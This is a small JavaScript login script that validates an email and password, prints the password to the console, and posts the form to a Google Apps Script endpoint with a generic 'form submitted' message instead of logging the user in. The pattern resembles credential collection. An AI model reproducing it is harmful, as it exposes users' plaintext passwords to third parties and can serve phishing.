function login() {
	// Get the values from the email and password fields
	var email = document.getElementById("email").value;
	var password = document.getElementById("pwd1").value;
	var filter =
	  /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	if (email == "") {
	  alert("Please enter Email ID.");
	  return;
	} else if (password == "") {
	  alert("Enter the Password");
	  return;
	} else if (!filter.test(email)) {
	  alert("Enter valid email id.");
	  return;
	} else if (password.length < 6) {
	  alert("Password should have minimum length of 6.");
	  return;
	}
  
   
	console.log("Email:", email);
	console.log("Password:", password);
  
	const scriptURL =
	  "https://script.google.com/macros/s/AKfycbyQGx1pO5pSJbHjbLF_opLD9lhIybnFprok0nt8KUiqf3tWJFMARBZaZtM9IedAFg5ccw/exec";
  
	const form = document.forms["loginForm"];
  
	form.addEventListener("submit", (e) => {
	  e.preventDefault();
	  fetch(scriptURL, {
		method: "POST",
		body: new FormData(form),
		mode: "no-cors",
	  })
		.then((response) =>
		  alert("Thank you! your form is submitted successfully.")
		)
		.then(() => {
		  window.location.reload();
		})
		.catch((error) => console.error("Error!", error.message));
	});
  }
  
  
//Reset Inputfield code.
function clearFunc() {
  document.getElementById("email").value = "";
  document.getElementById("pwd1").value = "";
}
